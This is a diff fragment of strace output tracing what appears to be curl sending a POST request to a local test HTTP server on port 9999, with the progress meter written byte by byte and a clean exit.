+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "D", 1D)           = 1
+[pid 204979] write(2, "l", 1l)           = 1
+[pid 204979] write(2, "o", 1o)           = 1
+[pid 204979] write(2, "a", 1a)           = 1
+[pid 204979] write(2, "d", 1d)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "U", 1U)           = 1
+[pid 204979] write(2, "p", 1p)           = 1
+[pid 204979] write(2, "l", 1l)           = 1
+[pid 204979] write(2, "o", 1o)           = 1
+[pid 204979] write(2, "a", 1a)           = 1
+[pid 204979] write(2, "d", 1d)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "T", 1T)           = 1
+[pid 204979] write(2, "o", 1o)           = 1
+[pid 204979] write(2, "t", 1t)           = 1
+[pid 204979] write(2, "a", 1a)           = 1
+[pid 204979] write(2, "l", 1l)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "S", 1S)           = 1
+[pid 204979] write(2, "p", 1p)           = 1
+[pid 204979] write(2, "e", 1e)           = 1
+[pid 204979] write(2, "n", 1n)           = 1
+[pid 204979] write(2, "t", 1t)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "L", 1L)           = 1
+[pid 204979] write(2, "e", 1e)           = 1
+[pid 204979] write(2, "f", 1f)           = 1
+[pid 204979] write(2, "t", 1t)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "S", 1S)           = 1
+[pid 204979] write(2, "p", 1p)           = 1
+[pid 204979] write(2, "e", 1e)           = 1
+[pid 204979] write(2, "e", 1e)           = 1
+[pid 204979] write(2, "d", 1d)           = 1
+[pid 204979] write(2, "\n", 1
+)          = 1
+[pid 204979] write(2, "\r", 1)          = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "0", 10)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "0", 10)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "0", 10)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "0", 10)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "0", 10)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "0", 10)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "0", 10)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "0", 10)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, ":", 1:)           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, ":", 1:)           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, ":", 1:)           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, ":", 1:)           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, ":", 1:)           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, ":", 1:)           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "0", 10)           = 1
+[pid 204979] poll([{fd=5, events=POLLPRI|POLLOUT|POLLWRNORM}], 1, 0) = 1 ([{fd=5, revents=POLLOUT|POLLWRNORM}])
+[pid 204979] getsockopt(5, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
+[pid 204979] getpeername(5, {sa_family=AF_INET, sin_port=htons(9999), sin_addr=inet_addr("127.0.0.1")}, [128 => 16]) = 0
+[pid 204979] getsockname(5, {sa_family=AF_INET, sin_port=htons(37598), sin_addr=inet_addr("127.0.0.1")}, [128 => 16]) = 0
+[pid 204979] sendto(5, "POST / HTTP/1.1\r\nHost: localhost"..., 3078, MSG_NOSIGNAL, NULL, 0) = 3078
+[pid 204979] poll([{fd=5, events=POLLIN|POLLPRI|POLLRDNORM|POLLRDBAND}], 1, 0) = 0 (Timeout)
+[pid 204979] rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f13292ee520}, NULL, 8) = 0
+[pid 204979] poll([{fd=5, events=POLLIN}, {fd=3, events=POLLIN}], 2, 193) = 1 ([{fd=5, revents=POLLIN}])
+[pid 204979] rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f13292ee520}, 8) = 0
+[pid 204979] rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f13292ee520}, NULL, 8) = 0
+[pid 204979] poll([{fd=5, events=POLLIN|POLLPRI|POLLRDNORM|POLLRDBAND}], 1, 0) = 1 ([{fd=5, revents=POLLIN|POLLRDNORM}])
+[pid 204979] recvfrom(5, "HTTP/1.0 200 OK\r\nServer: BaseHTT"..., 102400, 0, NULL, NULL) = 117
+[pid 204979] newfstatat(1, "", {st_mode=S_IFREG|0664, st_size=63371, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f13292ee520}, NULL, 8) = 0
+[pid 204979] poll([{fd=5, events=POLLIN}, {fd=3, events=POLLIN}], 2, 193) = 1 ([{fd=5, revents=POLLIN}])
+[pid 204979] rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f13292ee520}, 8) = 0
+[pid 204979] rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f13292ee520}, NULL, 8) = 0
+[pid 204979] poll([{fd=5, events=POLLIN|POLLPRI|POLLRDNORM|POLLRDBAND}], 1, 0) = 1 ([{fd=5, revents=POLLIN|POLLRDNORM}])
+[pid 204979] recvfrom(5, "", 102400, 0, NULL, NULL) = 0
+[pid 204979] write(2, "\r", 1)          = 1
+[pid 204979] write(2, "1", 11)           = 1
+[pid 204979] write(2, "0", 10)           = 1
+[pid 204979] write(2, "0", 10)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "2", 12)           = 1
+[pid 204979] write(2, "9", 19)           = 1
+[pid 204979] write(2, "5", 15)           = 1
+[pid 204979] write(2, "3", 13)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "0", 10)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "2", 12)           = 1
+[pid 204979] write(2, "5", 15)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "1", 11)           = 1
+[pid 204979] write(2, "0", 10)           = 1
+[pid 204979] write(2, "0", 10)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "2", 12)           = 1
+[pid 204979] write(2, "9", 19)           = 1
+[pid 204979] write(2, "2", 12)           = 1
+[pid 204979] write(2, "8", 18)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "3", 13)           = 1
+[pid 204979] write(2, "6", 16)           = 1
+[pid 204979] write(2, "8", 18)           = 1
+[pid 204979] write(2, "3", 13)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "4", 14)           = 1
+[pid 204979] write(2, "2", 12)           = 1
+[pid 204979] write(2, "1", 11)           = 1
+[pid 204979] write(2, "k", 1k)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, ":", 1:)           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, ":", 1:)           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, ":", 1:)           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, ":", 1:)           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, ":", 1:)           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, ":", 1:)           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, "-", 1-)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "4", 14)           = 1
+[pid 204979] write(2, "8", 18)           = 1
+[pid 204979] write(2, "0", 10)           = 1
+[pid 204979] write(2, "k", 1k)           = 1
+[pid 204979] write(2, "\n", 1
+)          = 1
+[pid 204979] close(5)                   = 0
+[pid 204979] rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f13292ee520}, NULL, 8) = 0
+[pid 204979] rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f13292ee520}, NULL, 8) = 0
+[pid 204979] write(1, "Response to POST request\n", 25Response to POST request
+) = 25
+[pid 204979] rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f13292ee520}, 8) = 0
+[pid 204979] rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f13292ee520}, NULL, 8) = 0
+[pid 204979] rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f13292ee520}, 8) = 0
+[pid 204979] rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f13292ee520}, NULL, 8) = 0
+[pid 204979] rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f13292ee520}, NULL, 8) = 0
+[pid 204979] close(3)                   = 0
+[pid 204979] close(4)                   = 0
+[pid 204979] rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f13292ee520}, NULL, 8) = 0
+[pid 204979] rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f13292ee520}, 8) = 0
+[pid 204979] rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f13292ee520}, NULL, 8) = 0
+[pid 204979] rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f13292ee520}, NULL, 8) = 0
+[pid 204979] rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f13292ee520}, 8) = 0
+[pid 204979] rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f13292ee520}, NULL, 8) = 0
+[pid 204979] rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f13292ee520}, NULL, 8) = 0
+[pid 204979] exit_group(0)              = ?
+[pid 204979] +++ exited with 0 +++
+<... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 204979
+--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=204979, si_uid=1000, si_status=0, si_utime=0, si_stime=0} ---
+rt_sigreturn({mask=[]})                 = 204979
+wait4(-1, 0x7ffed4dd5eac, WNOHANG, NULL) = -1 ECHILD (No child processes)
 read(10, "", 8192)                      = 0
 exit_group(0)                           = ?
 +++ exited with 0 +++
